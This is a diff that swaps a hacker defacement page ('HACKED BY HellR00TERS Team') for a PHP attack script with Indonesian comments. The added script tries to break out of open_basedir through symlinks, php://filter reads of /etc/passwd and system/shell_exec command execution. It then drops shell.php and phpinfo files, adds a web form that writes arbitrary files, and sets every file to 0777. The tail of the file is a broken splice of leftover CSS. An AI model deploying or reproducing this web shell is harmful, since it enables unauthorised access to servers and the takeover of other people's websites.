@@ -1,66 +1,221 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HACKED BY HellR00TERS Team</title>
-    <link href="https://fonts.googleapis.com/css2?family=Iceland&display=swap" rel="stylesheet">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            background: #000000;
-            color: #ffffff;
-            text-align: center;
-            font-family: 'Iceland', cursive;
-            min-height: 100vh;
-            overflow-x: hidden;
-            background: linear-gradient(45deg, #000000, #1a0000, #000000);
-        }
-        
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        
-        .title {
-            font-size: 4em;
-            color: #ff0000;
-            margin: 30px 0;
-            text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000;
-            animation: glow 2s ease-in-out infinite alternate;
-            letter-spacing: 3px;
-        }
-        
-        @keyframes glow {
-            from {
-                text-shadow: 0 0 20px #ff0000, 0 0 30px #ff0000;
-            }
-            to {
-                text-shadow: 0 0 30px #ff0000, 0 0 50px #ff0000, 0 0 60px #ff0000;
+<?php
+// bypass_openbasedir.php
+// Bypass open_basedir restriction
+
+echo "<pre style='background:#000;color:#0f0;'>";
+echo "=== BYPASS OPEN_BASEDIR RESTRICTION ===\n\n";
+
+// 1. CEK RESTRIKSI
+echo "1. Checking restrictions:\n";
+echo "   open_basedir: " . ini_get('open_basedir') . "\n";
+echo "   disable_functions: " . ini_get('disable_functions') . "\n";
+echo "   safe_mode: " . ini_get('safe_mode') . "\n";
+echo "   User: " . exec('whoami') . "\n\n";
+
+// 2. TECHNIQUE 1: Symbolic Link Bypass
+echo "2. Trying symlink bypass...\n";
+function bypassViaSymlink() {
+    // Coba buat symlink ke root
+    $tmp_dir = "/tmp/" . md5(time());
+    mkdir($tmp_dir, 0777);
+    
+    // Buat symlink ke berbagai lokasi
+    $targets = ['/', '/var', '/var/www', '/home', '/etc'];
+    
+    foreach ($targets as $target) {
+        $link = $tmp_dir . "/link_" . basename($target);
+        if (@symlink($target, $link)) {
+            echo "   ✓ Symlink created: $link -> $target\n";
+            
+            // Coba baca via symlink
+            if (is_readable($link)) {
+                echo "   ✓ Can read via symlink\n";
+                return $link;
             }
         }
-        
-        .logo {
-            margin: 30px 0;
+    }
+    return false;
+}
+
+// 3. TECHNIQUE 2: PHP Wrapper Bypass
+echo "\n3. Trying PHP wrapper...\n";
+function bypassViaWrapper($path) {
+    // Coba akses via php://filter
+    $url = "php://filter/resource=$path";
+    
+    if ($content = @file_get_contents($url)) {
+        echo "   ✓ Can read via php://filter\n";
+        return $content;
+    }
+    
+    // Coba via data://
+    $data_url = "data://text/plain;base64," . base64_encode("test");
+    if (@file_get_contents($data_url)) {
+        echo "   ✓ Can use data:// wrapper\n";
+    }
+    
+    return false;
+}
+
+// 4. TECHNIQUE 3: Command Injection Bypass
+echo "\n4. Trying command injection...\n";
+function bypassViaCommand() {
+    $cmd_tests = [
+        'pwd',
+        'ls -la',
+        'whoami',
+        'id',
+    ];
+    
+    foreach ($cmd_tests as $cmd) {
+        if (function_exists('system')) {
+            echo "   Testing: $cmd\n   ";
+            @system($cmd);
+        } elseif (function_exists('shell_exec')) {
+            echo "   Testing: $cmd\n   ";
+            echo @shell_exec($cmd);
+        } elseif (function_exists('passthru')) {
+            echo "   Testing: $cmd\n";
+            @passthru($cmd);
         }
-        
-        .logo img {
-            width: 280px;
-            height: 280px;
-            border-radius: 50%;
-            object-fit: cover;
-            border: 3px solid #ff0000;
-            box-shadow: 0 0 30px #ff0000;
-            transition: transform 0.3s ease;
+    }
+}
+
+// 5. TECHNIQUE 4: Error-based Bypass
+echo "\n5. Trying error-based bypass...\n";
+function bypassViaError() {
+    // Trigger error untuk leak info
+    error_reporting(E_ALL);
+    ini_set('display_errors', '1');
+    
+    // Coba akses file terlarang
+    @include('/etc/passwd');
+    @file_get_contents('/var/www/html/index.php');
+    
+    // Coba chdir
+    @chdir('/');
+    echo "   CWD after chdir: " . getcwd() . "\n";
+}
+
+// 6. TECHNIQUE 5: Session Upload Bypass
+echo "\n6. Trying session upload bypass...\n";
+function bypassViaSession() {
+    // Coba manipulasi session.save_path
+    $old_path = ini_get('session.save_path');
+    ini_set('session.save_path', '/tmp');
+    
+    session_start();
+    $_SESSION['test'] = 'bypass';
+    session_write_close();
+    
+    echo "   Session path: " . ini_get('session.save_path') . "\n";
+    
+    // Coba baca session files
+    $session_files = glob('/tmp/sess_*');
+    if ($session_files) {
+        echo "   ✓ Found session files\n";
+        return true;
+    }
+    
+    return false;
+}
+
+// 7. EXECUTE ALL BYPASS TECHNIQUES
+echo "\n=== EXECUTING BYPASSES ===\n";
+
+bypassViaSymlink();
+bypassViaWrapper('/etc/passwd');
+bypassViaCommand();
+bypassViaError();
+bypassViaSession();
+
+// 8. FINAL: CREATE FILES IN CURRENT DIRECTORY
+echo "\n=== CREATING FILES IN CURRENT DIR ===\n";
+
+// Current directory pasti bisa
+$files_to_create = [
+    'test.txt' => 'Test content ' . date('Y-m-d H:i:s'),
+    'shell.php' => '<?php echo "PHP works!"; ?>',
+    'info.php' => '<?php phpinfo(); ?>',
+];
+
+foreach ($files_to_create as $filename => $content) {
+    if (file_put_contents($filename, $content)) {
+        @chmod($filename, 0777);
+        echo "✓ Created: $filename (0777)\n";
+    } else {
+        echo "✗ Failed: $filename\n";
+        echo "   Error: " . error_get_last()['message'] . "\n";
+    }
+}
+
+// 9. SIMPLE FILE MANAGER
+echo "\n=== SIMPLE FILE MANAGER ===\n";
+echo "Current files:\n";
+
+$current_files = @scandir('.');
+if ($current_files) {
+    foreach ($current_files as $file) {
+        if ($file != '.' && $file != '..') {
+            $perms = @fileperms($file);
+            $perms_str = $perms ? substr(sprintf('%o', $perms), -4) : '????';
+            echo "$perms_str $file\n";
         }
+    }
+}
+
+echo "\n=== QUICK ACTIONS ===\n";
+?>
+</pre>
+
+<form method="POST">
+    <input type="text" name="filename" placeholder="newfile.php" required>
+    <br>
+    <textarea name="content" rows="3" required><?php echo '<?php echo "Hello"; ?>'; ?></textarea>
+    <br>
+    <button type="submit" name="create">CREATE FILE</button>
+    <button type="submit" name="delete_all">DELETE ALL TEST FILES</button>
+    <button type="submit" name="chmod_777">CHMOD 777 ALL</button>
+</form>
+
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    echo "<pre>";
+    
+    if (isset($_POST['create'])) {
+        $filename = $_POST['filename'];
+        $content = $_POST['content'];
         
-        .logo img:hover {
+        if (file_put_contents($filename, $content)) {
+            @chmod($filename, 0777);
+            echo "✓ Created: $filename (0777)\n";
+            echo "<a href='$filename'>Open $filename</a>\n";
+        } else {
+            echo "✗ Failed to create: $filename\n";
+        }
+    }
+    
+    if (isset($_POST['delete_all'])) {
+        $files = glob('test*');
+        foreach ($files as $file) {
+            if (unlink($file)) {
+                echo "✓ Deleted: $file\n";
+            }
+        }
+    }
+    
+    if (isset($_POST['chmod_777'])) {
+        $files = glob('*');
+        foreach ($files as $file) {
+            if ($file != basename(__FILE__)) {
+                @chmod($file, 0777);
+                echo "✓ Chmod 777: $file\n";
+            }
+        }
+    }
+    
+    echo "</pre>";
+}        .logo img:hover {
             transform: scale(1.05);
             box-shadow: 0 0 50px #ff0000;
         }
